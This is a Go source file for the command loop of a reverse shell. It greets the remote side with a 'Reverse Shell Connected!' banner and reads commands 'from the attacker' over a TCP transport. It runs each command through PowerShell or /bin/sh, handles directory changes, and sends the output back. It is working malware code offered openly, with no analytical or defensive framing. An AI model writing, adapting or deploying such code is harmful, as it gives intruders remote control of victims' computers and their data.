package shell

import (
	"fmt"
	"nombredetuapp/Documents/Proyecto/src/transport"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func ShellHandler(t transport.TCPTransport) {
	osUsed := runtime.GOOS
	//Get the current username from environment variables
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	//Get the current directory and creates the prompt for the reverse shell
	currenDir, _ := os.Getwd()
	prompt := username + "@" + currenDir + "$~ "

	header := fmt.Sprintf("\n[+] Reverse Shell Connected! \n[+] Type 'exit' to terminate the session.\n\n")
	t.Send([]byte(header))

	//Declares the shell path and arguments based on the operating system, Windows or Unix-based systems
	var shellPath string
	var shellArgs []string
	if osUsed == "windows" {
		shellPath = "powershell.exe"
		shellArgs = []string{
			"-NoLogo",
			"-NoProfile",
			"-Command"}
	} else {
		shellPath = "/bin/sh"
		shellArgs = []string{"-c"}
	}
	for {
		//Sends the prompt to the attacker
		t.Send([]byte(prompt))

		//Reads the command from the attacker
		input, err := t.Read()
		if err != nil {
			break
		}

		cmdStr := strings.TrimSpace(string(input))
		if cmdStr == "exit" {
			break
		}

		if strings.HasPrefix(cmdStr, "cd ") {
			newdir := strings.TrimSpace(cmdStr[3:])
			if newdir == "" {
				if osUsed == "windows" {
					newdir = os.Getenv("USERPROFILE")
				} else {
					newdir = os.Getenv("HOME")
				}
			}
			err := os.Chdir(newdir)
			if err != nil {
				t.Send([]byte(fmt.Sprintf("[!] Error: %v\r\n", err)))
			} else {
				currenDir, _ = os.Getwd()
				prompt = username + "@" + currenDir + "$~ "
			}
			continue
		}
		//Executes the command using the specified shell
		fullCmd := append(shellArgs, cmdStr)
		cmd := exec.Command(shellPath, fullCmd...)
		output, err := cmd.CombinedOutput()
		finalOutput := string(output)
		if err != nil {
			finalOutput += fmt.Sprintf("\n[!] Error al ejecutar el comando: %v \n\n", err)
		}
		finalOutput = strings.ReplaceAll(finalOutput, "\n", "\r\n")
		t.Send([]byte(finalOutput))
	}
}
